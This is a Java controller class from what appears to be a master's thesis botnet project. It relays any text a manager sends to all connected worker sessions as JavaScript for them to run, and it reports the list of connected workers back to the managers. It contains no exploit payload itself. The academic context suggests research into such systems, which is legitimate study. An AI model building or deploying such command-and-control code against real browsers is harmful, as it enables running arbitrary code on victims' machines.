package fhws.masterarbeit.botnetz.controller;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;

import javax.websocket.Session;

import fhws.masterarbeit.botnetz.model.ConsoleWriter;
import fhws.masterarbeit.botnetz.model.MyObserver;
import fhws.masterarbeit.botnetz.model.SessionMonitor;
import fhws.masterarbeit.botnetz.server.BotnetzManagerWebsocket;
import fhws.masterarbeit.botnetz.server.BotnetzWorkerWebsocket;

public class ManagerController implements MyObserver
{
	private static ManagerController controller = new ManagerController();
	private SessionMonitor sessionMonitor;
	private ConsoleWriter consoleWriter;
	
	private ManagerController()
	{
		this.sessionMonitor = SessionMonitor.getSessionMonitor();
		this.consoleWriter = ConsoleWriter.getConsoleWriter();
	}//end constructor
	
	public static ManagerController getController()
	{
		return controller;
	}//end method getController

	public void sessionAdded(Session session) 
	{
		this.sessionMonitor.addManagerSession(session);
		this.sessionMonitor.addObserver(this);
	}//end method sessionAdded

	public void sessionRemoved(Session session) 
	{
		this.sessionMonitor.removeManagerSession(session);
		this.sessionMonitor.removeObserver(this);
		
		try 
		{
			BotnetzManagerWebsocket.closeSession(session);
		}//end try
		catch (Throwable throwable)
		{
			this.consoleWriter.writeErrorToConsole(throwable);
		}//end catch
	}//end method sessionRemoved

	public void handleError(Throwable throwable) 
	{
		consoleWriter.writeErrorToConsole(throwable);
	}//end method handleError

	public void handleTextMessage(String message) 
	{
		HashMap<String, Session> sessionList = this.sessionMonitor.getWorkerSessionList();
		Iterator<Entry<String, Session>> it = sessionList.entrySet().iterator();
			
		while (it.hasNext())
		{
			Map.Entry<String, Session> entry = (Map.Entry<String, Session>) it.next();
			BotnetzWorkerWebsocket.sendJavaScript(entry.getValue(), message);
		}//end while
	}//end method handleTextMessage

	@Override
	public void onUpdate(HashMap<String, Session> sessionList)
	{	
		Iterator<Entry<String, Session>> it = sessionMonitor.getManagerSessionList().entrySet().iterator();
				
		while (it.hasNext())
		{
			Map.Entry<String, Session> entry = (Map.Entry<String, Session>) it.next();
			try 
			{
				BotnetzManagerWebsocket.sendWorkerSessionList(entry.getValue(), sessionList);
			}//end try 
			catch (Throwable throwable) 
			{
				consoleWriter.writeErrorToConsole(throwable);
			}//end catch
		}//end while
	}//end method onUpdate
}//end class ManagerController
